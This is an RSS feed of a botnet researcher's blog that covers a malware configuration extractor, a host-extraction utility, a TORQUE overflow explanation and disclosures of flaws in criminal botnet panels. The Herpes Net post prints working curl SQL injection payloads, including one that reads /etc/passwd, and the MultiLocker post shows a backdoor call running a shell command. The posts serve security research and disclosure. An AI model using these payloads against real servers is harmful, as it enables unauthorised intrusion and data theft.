<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>@botnet_hunter&#39;s blog</title>
    <link>https://bwall.github.io/</link>
    <description>Recent content on @botnet_hunter&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Â© 2015 Copyright Brian Wallace</copyright>
    <lastBuildDate>Sun, 04 Oct 2015 17:59:07 -0700</lastBuildDate>
    <atom:link href="https://bwall.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Using bamfdetect </title>
      <link>https://bwall.github.io/bamfdetect/</link>
      <pubDate>Sun, 04 Oct 2015 17:59:07 -0700</pubDate>
      
      <guid>https://bwall.github.io/bamfdetect/</guid>
      <description>

&lt;p&gt;When hunting botnets, whether they are custom developed or widely available, it can be helpful to statically extract configurations.  With this ability, an automated workflow can be developed to identify and track botnets at scale.  For this reason, I have developed &lt;a href=&#34;https://github.com/bwall/bamfdetect&#34;&gt;bamfdetect&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h1 id=&#34;bamfdetect:edf56eff04a8abdbcf184973e6c4191b&#34;&gt;bamfdetect&lt;/h1&gt;

&lt;p&gt;bamfdetect is a tool which is designed to identify malware samples and statically extract their configuration information, such as the domain name of the command and control server.  It is capable of taking in a single file path, or a variety of file paths.  It supports searching inside of directories, archives, etc. Once it identifies files to process, it starts processing through groups of modules.  The modules are as follows.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Preprocessors&lt;/li&gt;
&lt;li&gt;Bot Modules&lt;/li&gt;
&lt;li&gt;Postprocessors&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;preprocessors:edf56eff04a8abdbcf184973e6c4191b&#34;&gt;Preprocessors&lt;/h2&gt;

&lt;p&gt;Preprocessors have the ability to modify the file before being processed by the bot modules.  This can be useful if files are somehow packed or obfuscated.  The only currently (at the time of this blog being written) implemented preprocessor is the UPX decompressor.  This identifies if the input file is UPX compressed, then uses the UPX binary installed on the system to decompress it.  This functionality may be removed in the near future.&lt;/p&gt;

&lt;p&gt;A planned preprocessor module is a reimplementation of the PHP decoder I have running &lt;a href=&#34;https://defense.ballastsecurity.net/decoding/index.php&#34;&gt;here&lt;/a&gt;.  This would deobfuscate PHP files being processed.&lt;/p&gt;

&lt;h2 id=&#34;bot-modules:edf56eff04a8abdbcf184973e6c4191b&#34;&gt;Bot Modules&lt;/h2&gt;

&lt;p&gt;Bot modules are the heart of bamfdetect.  These modules are implemented in two portions, the identifier and the extractor.  The identifiers, all of which are currently Yara signatures, identify whether a file being analyzed is a bot supported by the bot module.  Since bot modules tend to focus on a single bot type or a family of very similar bots, this generally confirms that the module is likely capable of extracting the configuration.&lt;/p&gt;

&lt;p&gt;The configuration extraction is then done with Python code.  Configuration extraction can be very strict or very loose, depending on how reliably the configuration is stored in the malware.  Admitedly, in some cases, the configuration extraction methods have been implemented somewhat lazily, so false positives and improperly extracted configurations are possible.&lt;/p&gt;

&lt;h2 id=&#34;postprocessors:edf56eff04a8abdbcf184973e6c4191b&#34;&gt;Postprocessors&lt;/h2&gt;

&lt;p&gt;The purpose of postprocessor modules are to run after a file has been identified by at least one module.  The postprocessor modules also have access to the extracted configuration information, so they can be acted upon.  The only currently included postprocessing module calculates hashes on the file that was processed.  I do have a few private postprocessing modules which I will mention shortly.&lt;/p&gt;

&lt;h1 id=&#34;workflow:edf56eff04a8abdbcf184973e6c4191b&#34;&gt;Workflow&lt;/h1&gt;

&lt;p&gt;bamfdetect is a wonderful component of my malware tracking workflow.  Clearly, I&amp;rsquo;m not about to give away all my secrets right now, but here is a sample workflow which can be done with bamfdetect.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;https://bwall.github.io/images/bamfworkflow.png&#34; /&gt;
    
    
    &lt;figcaption&gt;
        &lt;h4&gt;Bot tracking workflow&lt;/h4&gt;
        
    &lt;/figcaption&gt;
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Since bamfdetect has Yara signatures defined inside of it, these Yara signatures can be used in services such as VirusTotal Hunting in order to hunt for relevant samples.  One can very simply download all files that trigger VirusTotal Hunting, and then feed them into bamfdetect.  Files can also be fed in through a variety of other sources.&lt;/p&gt;

&lt;p&gt;In order to make use of this, we can create a postprocessing module for bamfdetect which will upload any command and control information to our botnet tracking system.  Since very few people utilize publicly available systems for this, the code below is very generic.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;from BAMF_Detect.postprocessors.common import Postprocessor, Postprocessors
import httplib
import urllib
import json


def submit_c2(c2_uri, bot_type, source, api_key):
    try:
        params = urllib.urlencode({&#39;api_key&#39;: api_key, &#39;uri&#39;: c2_uri, &#39;bot_type&#39;: bot_type, &#39;source&#39;: source})
        headers = {&amp;quot;Content-type&amp;quot;: &amp;quot;application/x-www-form-urlencoded&amp;quot;, &amp;quot;Accept&amp;quot;: &amp;quot;text/plain&amp;quot;}
        conn = httplib.HTTPSConnection(&amp;quot;c2_tracking.example.com&amp;quot;)
        conn.request(&amp;quot;POST&amp;quot;, &amp;quot;/upload_c2&amp;quot;, params, headers)
        response = conn.getresponse()
        data = response.read()
        conn.close()
        return json.loads(data)
    except KeyboardInterrupt:
        raise
    except:
        pass


class SubmitPanel(Postprocessor):
    def __init__(self):
        Postprocessor.__init__(
            self,
            name=&amp;quot;Hashes&amp;quot;,
            author=&amp;quot;Brian Wallace (@botnet_hunter)&amp;quot;,
            date=&amp;quot;March 14th, 2015&amp;quot;,
            description=&amp;quot;Submits panel to C2 database&amp;quot;,
            references=&amp;quot;&amp;quot;,
            version=&amp;quot;1.0.0.0&amp;quot;
        )

    def _do_processing(self, file_data, config):
        if &amp;quot;information&amp;quot; in config:
            configuration = config[&amp;quot;information&amp;quot;]
            bot_type = config[&amp;quot;type&amp;quot;].lower()

            if &amp;quot;c2_uri&amp;quot; in configuration:
                # Simple bot setup
                submit_c2(configuration[&amp;quot;c2_uri&amp;quot;], bot_type, &amp;quot;bamfdetect&amp;quot;, &amp;quot;api-key&amp;quot;)
            elif &amp;quot;c2s&amp;quot; in configuration:
                for c in configuration[&amp;quot;c2s&amp;quot;]:
                    if &amp;quot;c2_uri&amp;quot; in c:
                        submit_c2(c[&amp;quot;c2_uri&amp;quot;], bot_type, &amp;quot;bamfdetect&amp;quot;, &amp;quot;api-key&amp;quot;)

        return {}, file_data

Postprocessors.add_postprocessor(SubmitPanel())
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This way, anytime we scan a file, the command and control information will be uploaded to c2_tracking.example.com to be automatically tracked.  This is one of the methods I use to feed my botnet tracking platform.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;https://bwall.github.io/images/tracking.png&#34; /&gt;
    
    
    &lt;figcaption&gt;
        &lt;h4&gt;Bot tracking panel&lt;/h4&gt;
        
    &lt;/figcaption&gt;
    
&lt;/figure&gt;

&lt;a href=&#34;https://gist.github.com/bwall/aa3bf86bd2f2396d6ef5&#34;&gt;Tracking panel source&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>TORQUE Exploitation Explained</title>
      <link>https://bwall.github.io/torque-exploit/</link>
      <pubDate>Mon, 02 Jun 2014 16:19:07 -0700</pubDate>
      
      <guid>https://bwall.github.io/torque-exploit/</guid>
      <description>

&lt;p&gt;The purpose of this post is to explain the TORQUE vulnerability I recently created a proof of concept for. Since the proof of concept was just a simple stub, I feel the mechanics behind the exploit should be described as well.&lt;/p&gt;

&lt;h2 id=&#34;torque:235d1d0b5bce311605860146e8d37ef9&#34;&gt;Torque&lt;/h2&gt;

&lt;p&gt;To be completely honest, I have never used TORQUE before attempting to exploit it.  I was looking for a vague CVE to proof of concept, and this one did not appear to obscure &lt;a href=&#34;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0749&#34;&gt;CVE-2014-0749&lt;/a&gt;.  Since this application is open source, I was able to download and review the source code for this.  I was also able to see the &lt;a href=&#34;https://github.com/adaptivecomputing/torque/commit/3ed749263abe3d69fa3626d142a5789dcb5a5684&#34;&gt;pull request&lt;/a&gt; for resolving this issue (easy mode, amirite?).&lt;/p&gt;

&lt;p&gt;The line of code we are looking to exploit is &lt;a href=&#34;https://github.com/adaptivecomputing/torque/blob/master/src/lib/Libdis/disrsi_.c#L100&#34;&gt;here&lt;/a&gt;.  Libdis defines the protocol used for network communication, and we are exploiting a weakness in its core ability to function.  I&amp;rsquo;ll explain the relevant parts of this protocol.  Essentially, when reading in data, this protocol parses arbitrarily large data by first reading a digit.  This digit dictates how many digits will define how large the data will be.  Since the buffer for storing this data is only 64 bytes on an x64 machine, any value larger than two here will eventually lead in an overflow.  After it reads this first character, it then calls itself again to parse the digits for the size.  After parsing n digits, it now has its count for its final call to disrsi_.  In this call, we need to have it start with a digit again in order to reach the code we are exploiting.&lt;/p&gt;

&lt;p&gt;The pull request mentioned before adds a check at the beginning of the function to check the size of data to be read in.  Since the check actually happens after information is read from the socket pre-pull request, we can read in as much as 999999999 bytes (actually quite a bit less due to section restrictions).  Looking at the code, this issue may not be apparent, as where is the memcpy we are supposed to be exploiting?  Its in the &lt;a href=&#34;https://github.com/adaptivecomputing/torque/blob/85b58c5dd0abafe8e36450529e9a3df4e877039e/src/lib/Libifl/tcp_dis.c#L438&#34;&gt;tcp_gets&lt;/a&gt; at line &lt;a href=&#34;https://github.com/adaptivecomputing/torque/blob/85b58c5dd0abafe8e36450529e9a3df4e877039e/src/lib/Libifl/tcp_dis.c#L467&#34;&gt;467&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So essentially, to exploit this, we need to send three numbers.  The first is a single digit which defines the number of digits in the next number, and the second defines the size of the data we will overflow with.  Then another digit to continue to hit the tcp_gets function we need to exploit.  We can simply connect with a TCP socket, send &amp;ldquo;39991&amp;rdquo; then 999 A&amp;rsquo;s to cause the crash.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/33554/&#34;&gt;Exploit Stub&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Extract Hosts</title>
      <link>https://bwall.github.io/extract-hosts/</link>
      <pubDate>Fri, 18 Apr 2014 10:19:07 -0700</pubDate>
      
      <guid>https://bwall.github.io/extract-hosts/</guid>
      <description>

&lt;p&gt;Recently, I have been trying to focus more on creating small but useful utilities.  The first of these tools to be posted publicly is &lt;a href=&#34;https://github.com/bwall/ExtractHosts&#34;&gt;Extract Hosts&lt;/a&gt;.  The purpose of this utility is to search for domain names and IP addresses in the supplied input.  The following is information posted to the readme on the project page.  You can download the 1.1.0 release of Extract Hosts &lt;a href=&#34;https://github.com/bwall/ExtractHosts/archive/v1.1.0.zip&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h1 id=&#34;extracthosts:8154605aecfea6ca754b3151f752e9f0&#34;&gt;ExtractHosts&lt;/h1&gt;

&lt;p&gt;Extracts hosts (IP/Hostnames) from files.  Hosts can be extracted from text files, PE, etc.  Any file that keeps the
host in plaintext without obscuring it, this should extract it.&lt;/p&gt;

&lt;p&gt;The name came about when polling random people on the street about the idea, and they responded, &amp;ldquo;eh?&amp;rdquo;.  With this installed,
all you need to type is &amp;lsquo;eh&amp;rsquo; to start pulling hosts from input.&lt;/p&gt;

&lt;h1 id=&#34;installation:8154605aecfea6ca754b3151f752e9f0&#34;&gt;Installation&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;git clone https://github.com/bwall/ExtractHosts.git
cd ExtractHosts
sudo python setup.py install
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;examples:8154605aecfea6ca754b3151f752e9f0&#34;&gt;Examples&lt;/h1&gt;

&lt;p&gt;The following are just some example usages&lt;/p&gt;

&lt;h2 id=&#34;help:8154605aecfea6ca754b3151f752e9f0&#34;&gt;help&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;bwall@research:~$ eh -h
usage: /usr/local/bin/eh [-h] [-v] [-r] [-f] [-d] [-T] [path [path ...]]

Identifies and extracts domains and IPs from files

positional arguments:
  path                  Paths to files or directories to scan (if not
                        supplied, stdin is the file being read)

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program&#39;s version number and exit
  -r, --recursive       Scan paths recursively
  -f, --show-files      Show file names along with results
  -d, --hide-duplicates
                        Hide duplicate results (hides per file when show-files
                        is enabled)
  -s, --strict          Stricter processing of domains
  -T, --test            Run some quick self tests

/usr/local/bin/eh v1.1.0 by Brian Wallace (@botnet_hunter)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;wget:8154605aecfea6ca754b3151f752e9f0&#34;&gt;wget&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;bwall@research:~$ wget http://bwall.github.io/ -qO- | eh -d
bwall.github.io
twitter.com
gmail.com
github.com
README.md
ajax.googleapis.com
crypto-js.googlecode.com
google-analytics.com
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;malware:8154605aecfea6ca754b3151f752e9f0&#34;&gt;malware&lt;/h2&gt;

&lt;p&gt;The 0686429b86844d9d1a14a159a0263b9bfcea4fd247c77537aa0278c9c5cb4ac3 file is a sample of the POS malware, Dexter, created for demo purposes.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bwall@research:~$ eh 0686429b86844d9d1a14a159a0263b9bfcea4fd247c77537aa0278c9c5cb4ac3
houseofcarders.com
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;file-system-recursion:8154605aecfea6ca754b3151f752e9f0&#34;&gt;File system recursion&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;bwall@research:~$ eh -drf Downloads/PEStudio/
/home/bwall/Downloads/PEStudio/PeStudioFunctionsDeprecated.xml  www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioFunctionsDeprecated.xml  msdn.microsoft.com
/home/bwall/Downloads/PEStudio/PeStudioBlackListFunctions.xml   www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioEvasions.xml www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioIndicators.xml   www.winitor.com
/home/bwall/Downloads/PEStudio/ChangeLog.txt    winitor.com
/home/bwall/Downloads/PEStudio/ChangeLog.txt    www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioThresholds.xml   www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioWhiteListSections.xml    www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioBlackListLibraries.xml   www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioOrdinals.xml www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioVirusTotal.xml   www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioCodePages.xml    www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioCodePages.xml    msdn.microsoft.com
/home/bwall/Downloads/PEStudio/PeStudioWhiteListLibraries.xml   www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioFeatures.xml www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudio.exe 6.0.0.0
/home/bwall/Downloads/PEStudio/PeStudioSettings.xml www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioBlackListStrings.xml www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioBlackListStrings.xml internetmailru.cdnmail.ru
/home/bwall/Downloads/PEStudio/PeStudioBlackListStrings.xml sputnik.mail.ru
/home/bwall/Downloads/PEStudio/PeStudioBlackListStrings.xml mail.ru
/home/bwall/Downloads/PEStudio/PeStudioBlackListStrings.xml Command.com
/home/bwall/Downloads/PEStudio/PeStudioBlackListStrings.xml 127.0.0.1
/home/bwall/Downloads/PEStudio/PeStudioBlackListStrings.xml 2.0.0.1
/home/bwall/Downloads/PEStudio/PeStudioBlackListStrings.xml www.memtest86.com
/home/bwall/Downloads/PEStudio/PeStudioBlackListStrings.xml boxedapp.com
/home/bwall/Downloads/PEStudio/PeStudioBlackListStrings.xml PAYPAL.COM
/home/bwall/Downloads/PEStudio/PeStudioBlackListStrings.xml start.spoon.net
/home/bwall/Downloads/PEStudio/PeStudioFunctionsUndocumented.xml    www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioWellKnownResources.xml   www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioFunctionsMapping.xml www.winitor.com
/home/bwall/Downloads/PEStudio/PeParser.dll 776::06
/home/bwall/Downloads/PEStudio/PeParser.dll ::
/home/bwall/Downloads/PEStudio/PeParser.dll 3::
/home/bwall/Downloads/PEStudio/PeStudioTranslations.xml www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioBlackListLanguages.xml   www.winitor.com
/home/bwall/Downloads/PEStudio/PeStudioBlackListLanguages.xml   msdn.microsoft.com
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;change-log:8154605aecfea6ca754b3151f752e9f0&#34;&gt;Change log&lt;/h1&gt;

&lt;h2 id=&#34;version-1-1-0:8154605aecfea6ca754b3151f752e9f0&#34;&gt;Version 1.1.0&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Files are no longer loaded completely into RAM so larger files can be processed (performance increase noticed)&lt;/li&gt;
&lt;li&gt;Strict mode added, where domains are only considered if all lower case&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;todo:8154605aecfea6ca754b3151f752e9f0&#34;&gt;TODO&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;IPv6 regex needs to be shorted and heavily tested&lt;/li&gt;
&lt;li&gt;Heavier testing&lt;/li&gt;
&lt;li&gt;Improve performance&lt;/li&gt;
&lt;li&gt;Multiple core processing support&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Murdering Dexter</title>
      <link>https://bwall.github.io/murdering-dexter/</link>
      <pubDate>Sun, 16 Mar 2014 10:19:07 -0700</pubDate>
      
      <guid>https://bwall.github.io/murdering-dexter/</guid>
      <description>

&lt;p&gt;Occasionally, I like to build a vulnerable virtual machine demonstating a recently published vulnerability.  One of the reasons I do this is because such a small section of the industry is exposed to botnet panels, and the easiest way to get acquianted is by pwning them.  It also gives people an opportunity to legally use my exploits without hunting down the source code for the command and control panels themselves.  In this vulnerable virtual machine, you get an opportunity to &amp;ldquo;Murder Dexter&amp;rdquo;, the point of sale malware.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h1 id=&#34;murdering-dexter:0635b995738305bfac88ff5fd882f446&#34;&gt;Murdering Dexter&lt;/h1&gt;

&lt;p&gt;Much like my other vulnerable virtual machines, there are no supplied credentials.  The virtual machine itself uses DHCP to get an IP address, and while it does not need Internet access itself, you may wish to reference the Internet for some portions.  If you need to change something in the virtual machine in order to use it, you should be able to edit the shadow file in a live cd without hindering the challenge.&lt;/p&gt;

&lt;h1 id=&#34;download:0635b995738305bfac88ff5fd882f446&#34;&gt;Download&lt;/h1&gt;

&lt;p&gt;Download locations can be found &lt;a href=&#34;http://vulnhub.com/entry/bot-challenges-dexter,59/&#34;&gt;here&lt;/a&gt; as well as other information.&lt;/p&gt;

&lt;h1 id=&#34;credits:0635b995738305bfac88ff5fd882f446&#34;&gt;Credits&lt;/h1&gt;

&lt;p&gt;Thanks to everyone who beta tested this virtual machine!&lt;/p&gt;

&lt;h2 id=&#34;testers:0635b995738305bfac88ff5fd882f446&#34;&gt;Testers&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Andrew Morris (@TheAndrewBalls)&lt;/li&gt;
&lt;li&gt;Bas (@barrebas)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;developer:0635b995738305bfac88ff5fd882f446&#34;&gt;Developer&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Brian Wallace (@botnet_hunter)&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Herpes Net 3.0 SQLi</title>
      <link>https://bwall.github.io/herpes-net-3.0-sqli/</link>
      <pubDate>Sun, 09 Mar 2014 10:19:07 -0700</pubDate>
      
      <guid>https://bwall.github.io/herpes-net-3.0-sqli/</guid>
      <description>&lt;p&gt;During my talk at RSAC 2014, we announced multiple botnet vulnerabilities which had been discovered.  The following vulnerability is one of them.  Herpes Net is botnet with a wide range of functions, with everything from opening the CD tray to mining bitcoins (via plugins).  With a vulnerability in the command and control panel, we can get information on the botnet operator.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;When this vulnerability was discovered by myself, I had thought it was a rediscovery of a &lt;a href=&#34;https://code.google.com/p/malware-lu/wiki/en_analyse_herpnet&#34;&gt;vulnerability&lt;/a&gt; discovered by malware.lu.  Upon further investigation into their proof of concept, I found that the parameter they are injecting on no longer exists.  Instead of injecting on the &amp;lsquo;id&amp;rsquo; parameter, we can inject on the the &amp;lsquo;hwid&amp;rsquo; parameter.  The following is the vulnerable code (only relevant code displayed).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	$hwid = $_POST[&#39;hwid&#39;];
	if($header == &amp;quot;74978b6ecc6c19836a17a3c2cd0840b0&amp;quot;)
	{
		if ($hwid &amp;lt;&amp;gt; &amp;quot;&amp;quot;)
		{
			$bottest = mysql_query(&amp;quot;SELECT * FROM clients WHERE hwid = &#39;$hwid&#39;&amp;quot;);
			while($row = mysql_fetch_array($bottest))
		 	{$id = $row[&#39;id&#39;];}
			if(mysql_num_rows($bottest) == 1){
				$result = mysql_query(&amp;quot;SELECT * FROM commands WHERE botid = &#39;$id&#39; AND viewed = &#39;0&#39; LIMIT 1&amp;quot;);
				while($row = mysql_fetch_array($result))
				{
					echo $row[&#39;cmd&#39;].&amp;quot;|&amp;quot;.$row[&#39;variable&#39;];
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A keen eye will notice that there are two vulnerable queries in this code selection.  The first query, while injectable, does not have a direct influence on output.  While blind SQL injection is not improbable, it does make for quite a bit more noise when trying to extract information.  Just for reference though, here is a proof of concept blind SQLi.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;curl -A &amp;quot;74978b6ecc6c19836a17a3c2cd0840b0&amp;quot; -v http://c2.com/panels/herpes/run.php -d &amp;quot;hwid=&#39; AND 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,BENCHMARK(10000, SLEEP(1000)) -- --&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This should sleep for quite a while if exploited successfully.  If only we can get a result from the database to print out, we could use a much simpler, faster and quieter exploit.  If we return a SQL injection payload from the first query, we can exploit the next one, and return data to be read.  Here is what we want in our second query&amp;rsquo;s payload for a proof of concept.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&#39; AND 1=2 UNION ALL SELECT 1,2,load_file(&#39;/etc/passwd&#39;),4,5 -- --
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In order to do that, we should hex encode it.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;0x2720414e4420313d3220554e494f4e20414c4c2053454c45435420312c322c6c6f61645f66696c6528272f6574632f70617373776427292c342c35202d2d202d2d
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And now our proof of concept looks like the following.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;curl -A &amp;quot;74978b6ecc6c19836a17a3c2cd0840b0&amp;quot; -v http://c2.com/panels/herpes/run.php -d &amp;quot;hwid=&#39; AND 1=2 UNION ALL SELECT 0x2720414e4420313d3220554e494f4e20414c4c2053454c45435420312c322c6c6f61645f66696c6528272f6574632f70617373776427292c342c35202d2d202d2d,2,3,4,5,6,7,8,9 -- --&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The data returned will be followed by &amp;lsquo;|4&amp;rsquo; as that is what is being returned in the &amp;lsquo;variable&amp;rsquo; row.  We can of course control this value as well if needed.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/bwall/BAMF/blob/master/IntegrationQueue/http/herpesnet/herpesnet.class.py&#34;&gt;Here&lt;/a&gt; is a proof of concept which uses this second order SQL injection to extract the bot information from the database.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>MultiLocker Backdoor</title>
      <link>https://bwall.github.io/multilocker-backdoor/</link>
      <pubDate>Sun, 09 Mar 2014 10:19:07 -0700</pubDate>
      
      <guid>https://bwall.github.io/multilocker-backdoor/</guid>
      <description>&lt;p&gt;In a recent search through some underground communities, I came across the source code to a version of the MultiLocker panel.  With ransomware, the security industry is always looking for a good way to resolve the issue without the ransom being paid.  This could potentially be done by gathering information from the botnet&amp;rsquo;s panel.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;While there are likely other vulnerabilities, this one stood out after a quick grep of the code.  In the &amp;lsquo;lending/PL.php&amp;rsquo;, there is some obvious backdoor code.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if (!empty($_POST[&#39;c&#39;]))
{
system($_POST[&#39;c&#39;]);
die();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This can easily be accessed with curl or wget (let&amp;rsquo;s assume &lt;a href=&#34;http://c2.panel/&#34;&gt;http://c2.panel/&lt;/a&gt; is the MultiLocker panel root).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;curl -v -d &amp;quot;c=whoami&amp;quot; http://c2.panel/lending/PL.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;For more information on MultiLocker, you can check out a great blog post on it &lt;a href=&#34;http://www.xylibox.com/2012/11/multi-locker.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>RSAC 2014 Botnet Vulnerabilities</title>
      <link>https://bwall.github.io/rsac-2014-botnet-vulnerabilities/</link>
      <pubDate>Sun, 09 Mar 2014 10:19:07 -0700</pubDate>
      
      <guid>https://bwall.github.io/rsac-2014-botnet-vulnerabilities/</guid>
      <description>

&lt;p&gt;This year at RSAC 2014, Stuart McClure and myself did a talk titled Hacking Exposed: Art of Deterrence.  During this talk, we announced various botnet vulnerabilities which had not been previously disclosed and some that had been.  Here I will document some of them.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h1 id=&#34;dexter:160628beaf4e25343949f61770a22914&#34;&gt;Dexter&lt;/h1&gt;

&lt;p&gt;Dexter, the POS malware was the botnet in the primary focus of the talk.  There were 2 exploits released prior to RSAC, with slightly different objectives.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://raw.github.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/dexter_casinoloader_exec.rb&#34;&gt;Dexter MSF Module&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://raw.github.com/bwall/BAMF/master/IntegrationQueue/http/dexter.PoC.py&#34;&gt;Dexter BAMF PoC&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;madness-pro:160628beaf4e25343949f61770a22914&#34;&gt;Madness Pro&lt;/h1&gt;

&lt;p&gt;Madness Pro is a botnet focused on denial of service attacks.  The exploit for this botnet is not yet public as it is still very effective and there are still major versions of this botnet at large.  This exploit can be released upon request.&lt;/p&gt;

&lt;h1 id=&#34;herpes-net-3-0:160628beaf4e25343949f61770a22914&#34;&gt;Herpes Net 3.0&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bwall.github.io/herpes-net-30-sqli.html&#34;&gt;Herpes Net 3.0 SQLi&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;multilocker:160628beaf4e25343949f61770a22914&#34;&gt;MultiLocker&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bwall.github.io/multilocker-backdoor.html&#34;&gt;MultiLocker Backdoor&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>